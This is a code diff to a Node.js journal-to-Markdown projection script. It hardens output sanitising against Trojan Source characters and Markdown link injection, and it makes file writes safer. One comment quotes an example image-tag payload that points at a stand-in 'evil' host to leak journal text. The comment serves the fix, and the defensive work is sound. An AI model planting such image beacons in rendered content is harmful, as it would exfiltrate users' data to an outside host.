@@ -16,7 +16,7 @@
  *   node project.mjs <journal.jsonl> [--out-dir <dir>] [--check]
  * Exit: 0 ok · 1 projections drifted (--check) · 2 usage/IO error
  */
-import { existsSync, mkdirSync, readFileSync, renameSync, unlinkSync, writeFileSync } from 'node:fs';
+import { existsSync, mkdirSync, readFileSync, renameSync, statSync, unlinkSync, writeFileSync } from 'node:fs';
 import { dirname, join, resolve } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { readJournal } from './journal.mjs';
@@ -44,8 +44,10 @@ const MAX_MILESTONES = 50;
 /**
  * Make any journal value safe for one Markdown line: no newlines (they would
  * break a table row), no pipes/backticks (they would break the columns), no
- * `<`/`>` (they could close the GENERATED comment or inject HTML), and a hard
- * length cap so one huge `data` field cannot produce a megabyte-wide table.
+ * `<`/`>` (they could close the GENERATED comment or inject HTML), no `[`/`]`
+ * (Markdown link/image syntax reaching a remote host), no bidi overrides or
+ * zero-width characters (Trojan Source), and a hard length cap so one huge
+ * `data` field cannot produce a megabyte-wide table.
  */
 export function inline(value) {
   if (value === undefined || value === null) return '&mdash;';
@@ -53,9 +55,19 @@ export function inline(value) {
   if (typeof value === 'string') s = value;
   else if (Array.isArray(value)) s = value.map((v) => (typeof v === 'string' ? v : JSON.stringify(v))).join(', ');
   else s = JSON.stringify(value) ?? String(value);
-  // Control characters (newlines included) collapse to spaces: one journal
-  // value must never span more than one Markdown line.
-  s = s.replace(/[\u0000-\u001F\u007F]/g, ' ').replace(/\s+/g, ' ').trim();
+  // C0 (\u0000-\u001F), DEL + C1 (\u007F-\u009F), zero-width and
+  // direction marks (\u200B-\u200F), bidi embeddings/overrides
+  // (\u202A-\u202E), bidi isolates (\u2066-\u2069) and the BOM (\uFEFF)
+  // all collapse to a space. Control characters would break the row; an
+  // unterminated RLO would mirror every following column, so a journal
+  // value could rewrite the document a human reads (Trojan Source).
+  s = s
+    .replace(
+      /[\u0000-\u001F\u007F-\u009F\u200B-\u200F\u202A-\u202E\u2066-\u2069\uFEFF]/g,
+      ' ',
+    )
+    .replace(/\s+/g, ' ')
+    .trim();
   if (s === '') return '&mdash;';
   const cps = Array.from(s);
   if (cps.length > MAX_CELL) s = cps.slice(0, MAX_CELL - 1).join('') + '…';
@@ -65,7 +77,12 @@ export function inline(value) {
     .replace(/>/g, '&gt;')
     .replace(/\\/g, '&#92;')
     .replace(/\|/g, '&#124;')
-    .replace(/`/g, '&#96;');
+    .replace(/`/g, '&#96;')
+    // `[` and `]` disarm Markdown link/image syntax: without this a journal
+    // value could render as <img src="https://evil/?leak=..."> in GitHub or
+    // VS Code — a read beacon plus an exfiltration channel for journal text.
+    .replace(/\[/g, '&#91;')
+    .replace(/\]/g, '&#93;');
 }
 
 /** Natural order (`T-2` before `T-10`), total and deterministic. */
@@ -213,9 +230,24 @@ export function fold({ events = [], truncatedTail = false, badLines = [] } = {})
         break;
       }
       case 'report': {
-        // Close the OLDEST still-running spawn of that agent name; the journal
-        // carries no spawn id, so name + order is the only honest pairing.
-        const open = state.agents.find((a) => a.agent === data.agent && a.status === 'running');
+        // Pair the report with the spawn it actually belongs to. `report`
+        // carries `data.ticket`, so prefer the still-running spawn of that
+        // agent name working on THAT ticket; only when the report has no
+        // ticket do we fall back to the oldest open spawn of the same name.
+        //
+        // The name fallback is ambiguous by nature, and deliberately so:
+        // ADR-18 makes the journal enforce at most ONE open spawn per agent
+        // name in `journal.append`, which makes it provably unambiguous
+        // instead of pushing a spawn_id across a process boundary (the
+        // mechanism class that failed outright in v1). Do NOT "simplify"
+        // this back to a name-only lookup — see ADR-18 and the two
+        // concurrent-spawn tests in tests/unit/project.test.mjs.
+        const open =
+          (data.ticket != null &&
+            state.agents.find(
+              (a) => a.agent === data.agent && a.status === 'running' && a.ticket === data.ticket,
+            )) ||
+          state.agents.find((a) => a.agent === data.agent && a.status === 'running');
         if (open) {
           open.status = 'reported';
           open.verdict = data.verdict ?? null;
@@ -572,6 +604,9 @@ export function projectFile(file) {
   if (!existsSync(file)) {
     throw new IOError(`journal not found: ${resolve(file)}`);
   }
+  if (statSync(file).isDirectory()) {
+    throw new IOError(`journal path is a directory, not a file: ${resolve(file)}`);
+  }
   return renderProjections(readJournal(file));
 }
 
@@ -581,18 +616,50 @@ let tmpCounter = 0;
 
 /** Atomic write: a concurrent reader sees the old or the new file, never half. */
 export function writeAtomic(path, content) {
-  const tmp = join(dirname(path), `.${Date.now().toString(36)}-${process.pid}-${tmpCounter++}.tmp`);
+  const tmp = tempPathFor(path);
   try {
     writeFileSync(tmp, content, 'utf8');
     renameSync(tmp, path);
   } catch (err) {
-    try {
-      unlinkSync(tmp);
-    } catch {
-      /* nothing to clean up */
-    }
+    cleanUp(tmp);
     throw err;
   }
+}
+
+function tempPathFor(path) {
+  return join(dirname(path), `.${Date.now().toString(36)}-${process.pid}-${tmpCounter++}.tmp`);
+}
+
+function cleanUp(tmp) {
+  try {
+    unlinkSync(tmp);
+  } catch {
+    /* nothing to clean up */
+  }
+}
+
+/**
+ * Write a set of files as close to atomically as a filesystem allows: stage
+ * EVERY temp file first, then rename them all. A failure while staging (full
+ * disk, no permission) therefore leaves the previous projections completely
+ * untouched, instead of swapping STATE.md and then failing on PROGRESS.md.
+ *
+ * The pair is still not one transaction — the window shrinks to the gap
+ * between two renames rather than spanning a whole document write.
+ */
+export function writeAllAtomic(entries) {
+  const staged = [];
+  try {
+    for (const [path, content] of entries) {
+      const tmp = tempPathFor(path);
+      writeFileSync(tmp, content, 'utf8');
+      staged.push([tmp, path]);
+    }
+  } catch (err) {
+    for (const [tmp] of staged) cleanUp(tmp);
+    throw err;
+  }
+  for (const [tmp, path] of staged) renameSync(tmp, path);
 }
 
 /**
@@ -664,8 +731,23 @@ function main() {
   try {
     const { journal, outDir, check } = parseArgs(process.argv.slice(2));
     const dir = outDir ?? dirname(resolve(journal));
-    const { files, warnings: warn } = projectFile(journal);
+    const { files, state, warnings: warn } = projectFile(journal);
     for (const w of warn) console.error(`project: warning: ${w}`);
+
+    // Zero signal, pure noise: not one event parsed, yet the file had content
+    // we could not read. That is a wrong path or a non-journal file, and
+    // overwriting a good STATE.md with an empty one would hand the operator a
+    // false picture of the initiative under a success exit code. An EMPTY
+    // journal (no events, no damage) is still perfectly legal and projects to
+    // empty documents; partial damage with >= 1 readable event still warns
+    // and succeeds.
+    if (state.total === 0 && state.corruptLines + state.malformed > 0) {
+      throw new IOError(
+        `this does not look like a journal: 0 readable events, ` +
+          `${state.corruptLines} corrupt line(s), ${state.malformed} non-object line(s) — ` +
+          `refusing to overwrite projections in ${dir}`,
+      );
+    }
 
     if (check) {
       const results = Object.entries(files).map(([name, content]) => checkFile(join(dir, name), content));
@@ -680,9 +762,9 @@ function main() {
     }
 
     mkdirSync(dir, { recursive: true });
+    writeAllAtomic(Object.entries(files).map(([name, content]) => [join(dir, name), content]));
     for (const [name, content] of Object.entries(files)) {
       const path = join(dir, name);
-      writeAtomic(path, content);
       console.log(`wrote ${path} (${Buffer.byteLength(content, 'utf8')} B)`);
     }
   } catch (err) {
